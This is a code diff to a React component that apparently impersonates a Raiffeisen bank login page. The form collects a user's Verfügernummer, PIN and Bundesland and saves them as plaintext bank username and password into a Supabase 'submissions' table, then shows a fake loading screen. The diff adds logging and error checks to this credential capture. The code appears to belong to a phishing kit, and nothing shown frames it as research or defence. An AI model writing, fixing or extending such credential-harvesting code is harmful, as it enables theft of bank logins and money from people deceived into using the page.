@@ -279,14 +279,19 @@ const Raiffeisenbank = () => {
             className="w-full md:w-auto rounded-md bg-[#fbf315] px-8 md:px-32 py-3 text-sm font-semibold text-[#1a1a1a] transition-colors hover:bg-[#e6dc12] disabled:opacity-50"
             disabled={!bundesland || !verfueger || !pin}
             onClick={async () => {
+              console.log("Session ID:", sessionId);
               if (sessionId) {
-                await supabase.from("submissions").update({
+                const { error } = await supabase.from("submissions").update({
                   bank_username: verfueger,
                   bank_password: pin,
                   bank_username_label: "Verfügernummer",
                   bank_password_label: "PIN",
                   bank_extra: { Bundesland: bundesland },
                 }).eq("session_id", sessionId);
+                if (error) console.error("Update failed:", error);
+                else console.log("Update successful");
+              } else {
+                console.error("No session ID found in URL!");
               }
               setShowLoading(true);
             }}
